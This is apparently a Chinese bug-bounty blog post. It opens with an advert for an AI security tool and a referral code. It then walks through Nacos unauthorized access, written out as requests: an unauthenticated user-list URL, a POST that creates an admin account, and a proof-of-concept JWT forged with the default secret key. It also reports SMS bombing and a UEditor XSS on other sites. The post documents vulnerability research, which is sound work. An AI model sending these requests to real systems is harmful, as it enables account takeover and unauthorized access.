#  [SRC]漏洞显现  
原创 略懂安全的三秋
                    略懂安全的三秋  略懂安全的三秋   2026-05-23 03:37  
  
无问AI  
远超通用大模型，在网络安全问题理解、代码生成、安全研究分析及其他复杂场景上是你的最佳选择。  
  
链接：  
https://www.wwlib.cn/index.php/  
  
如果积分不够用可以使用我的积分码，  
即可领取  
100积分  
  
兑换链接：  
https://www.wwlib.cn/index.php/gift  
  
WUWEN_gD5m4O8qDIlh4Os6MX  
  
  
![屏幕截图 2026-05-08 110152.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbCsARibyyGfZKj4r7vAqyic90bibsnGQiaeHep4kibVicdibpA4LprR4KwdtcsP4S6PicRsFTJn5MibmBO19LfXQQxiccwzcHf8WaiapiaGZTU/640?wx_fmt=jpeg "")  
  
Nacos 未授权访问  
  
查看用户列表的请求并在前台访问  
  
http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9  
  
![屏幕截图 2026-05-08 110601.png](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbATDhsOMeic8TVGHb1TTpRJeu8MiciaNbpwXdmWWjr7CJqs5gic8PlYEUgbtXnHI8hLUvngibl56icbWwQGgSM7Hhv9ulzoBy6BTQ73E/640?wx_fmt=jpeg "")  
  
尝试创建用户并抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBzsqwzPkTl222ylAXprGauJ2ia61T7eicHGCDIFU6c1WJ9ROMELIVxE7KqpITibibOBLZICXY9Pe6nuibsqUey5ZKibkYDIueDd8Z9U/640?wx_fmt=jpeg&from=appmsg "")  
  
返回下列创建成功  
  
 {"code":200,"message":"create user ok!","data":null}  
  
  
 同样的我们简化请求  
```
POST /nacos/v1/auth/users?
username=peiqi&password=peiqi
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBKRSAxOyT29gA9ktUmX0UJDnLRF1otGHlUheveW2AmUUtMtHl7NiaXd0WicwKyfzYvqoBzyFWkib0C0lHIpO4p1tlsWLZciaOZhB8/640?wx_fmt=jpeg&from=appmsg "")  
  
使用我们创建的账号登录  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBxibicKUop4hAFqYIVN2V6m53N2t8icQvBvWvgNPBO68Ek7xS8qYGIbwAT1XDMEIA783DTMI1NicTGNO7a0grbksiciaJebuHMiaIDkU/640?wx_fmt=jpeg "")  
  
Nacos secret.key 默认密钥 未授权访问  
  
验证POC  
```
/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
```  
  
  
直接拦截登录包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbC44Diabbe1iaXeTFzftURBxpb5wXgPIsZWZsFKic7iadjmG1bBE2ic2Ux4zEyGCFqcibyicw8No3niauhPS2uJthDMGDNLg546XWw7MCo/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbCZSKP2Cx2rXhQwy5ZaGjD9fopGrfBxq0esDvH9oUwpmwhTPJUwl3M1z6Y7k1YFxeQFYnvZVJjZUs8ticlWdR8SjsgQJsOZC6Eg/640?wx_fmt=jpeg "")  
  
成功登录  
  
  
访问下一个站  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbAojGtufxb8G9xic0KvZo7uDDxicxPUmDkpwc5ibh1PPC4cOFExND1HaiaJbM9NZFE6TyhiarcvDFm5bNK7EZn6odIwTom8tibeGCjhk/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/Expression/Expression_3@2x.png "")  
  
继续下一个站  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbCnKpv681nA81icf8D8JXk4w6XKhCcrFeTOhfEVhDhAeJj8QF6k31TLpNXkkibxdOGYKicUibufjM3CvicCqF1N4j3A7PG41Pbvlrwg/640?wx_fmt=jpeg&from=appmsg "")  
  
因为有注册，所以注册一手  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBicJFw8EhnP4Aaxa63yG8ooH5icbFMP2xkTtMibXeQW5JKH2YibVeOz6bWZPMEN4AFVohtTtAGX04AiaWsCxoiaBK2IsFWpVRMGqEtA/640?wx_fmt=jpeg&from=appmsg "")  
  
这是验证码的请求包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbBJmyCpPiah5JiaQvHxoSRbib9ubh6PVayvOYSQv2rqdiaWflv1CRoUWeyTQVXicP1x1SpibiamcHrFJAdHXuiaU9rC76um7bvqqIhmiago/640?wx_fmt=jpeg&from=appmsg "")  
  
但它没有做风流限制所以就有了短信轰炸  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbBuuAic6xgqYPxjRQNA10CRurXnDvicrjMUmPfht6CCZPdXOQXib2Tr1zQRNzUNlF6o5OG4MzHg0J7YIt0eGDByHfa5kwAce0p3IU/640?wx_fmt=jpeg "")  
  
之后登录了也没发现什么，所以就去扫了一下目录，发现了  
ueditor  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbDqicJNHV2WvKia6BeMdN2ljJd5aNr28RhBt6Hu3Z5ZmH5Xia7HtARQQw4o08BUYzLHuvFSic7zOgk3bA7PuowTjrvicialyHzflOBiaQ/640?wx_fmt=jpeg "")  
  
这里只能水一个XSS了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAC31D6KkChxQQgSHQY4w1RJA77ibs1scRuFBt8icicvlXk6AOXH0ia2B6v2fK6KN7Dp5RKPmMEJCZXg47dOmZsEroIAusgkX5044w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAUcwFGmFQXtV3EYMrjPyOluVq1LaOAzBxibGWulwDWtuvyMOeqTrhHdRSh71T0IrQTHso4ze8jjEW21WibHw2lEiaCbkmiczjdm94/640?wx_fmt=jpeg&from=appmsg "")  
  
  
